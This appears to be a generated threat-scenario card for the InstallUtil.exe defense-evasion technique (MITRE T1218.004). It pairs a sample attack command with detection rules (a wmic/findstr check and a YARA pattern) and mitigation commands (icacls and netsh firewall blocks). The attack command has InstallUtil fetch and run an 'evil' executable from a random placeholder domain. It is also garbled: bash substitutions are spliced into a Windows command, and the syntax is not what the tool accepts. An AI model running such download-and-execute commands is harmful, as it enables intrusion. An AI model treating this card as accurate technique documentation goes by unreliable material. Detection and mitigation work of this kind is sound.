---
type: campaign
scenario_id: 194
tactic: Defense Evasion
technique: "T1218.004: InstallUtil"
technique_id: T1218.004
tags: [campaign, lotl, defense_evasion]
---

# Using InstallUtil.exe to execute malicious .NET binary remotely.

## Threat Description
Using InstallUtil.exe to execute malicious .NET binary remotely.

## Attack Command
```
InstallUtil /logfile= /LogToConsole=false /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor InstallUtil remote: `wmic process where name='InstallUtil.exe' get commandline | findstr http`; YARA rule: `rule InstallUtilRemote { strings: $a = /InstallUtil.*http.*exe/ nocase; condition: $a }`.

## Mitigation
Restrict InstallUtil: `icacls %windir%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /deny Everyone:RX`; Block .NET downloads: `netsh advfirewall firewall add rule name='Block InstallUtil' dir=out program='%windir%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe' action=block`.

## AI Training Prompt
Train AI to detect InstallUtil remote execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
